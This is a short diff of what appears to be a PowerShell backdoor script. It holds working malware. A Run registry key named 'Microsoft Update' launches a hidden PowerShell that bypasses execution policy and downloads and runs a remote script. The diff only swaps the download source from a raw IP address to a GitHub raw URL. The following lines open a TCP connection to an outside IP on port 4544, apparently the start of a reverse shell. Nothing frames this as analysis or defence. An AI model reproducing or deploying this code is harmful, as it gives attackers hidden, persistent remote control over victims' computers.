@@ -1,4 +1,4 @@
-Set-ItemProperty -Path "HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Microsoft Update" -Value "powershell -w Hidden -Exec Bypass -c IEX (New-Object System.Net.Webclient).DownloadString('http://163.172.144.82/scrip/ch.ps1')" -Force
+Set-ItemProperty -Path "HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Microsoft Update" -Value "powershell -w Hidden -Exec Bypass -c IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/userdol/software/master/ch.ps1')" -Force
 $client = New-Object System.Net.Sockets.TCPClient("163.172.144.82",4544);
 $stream = $client.GetStream();
 
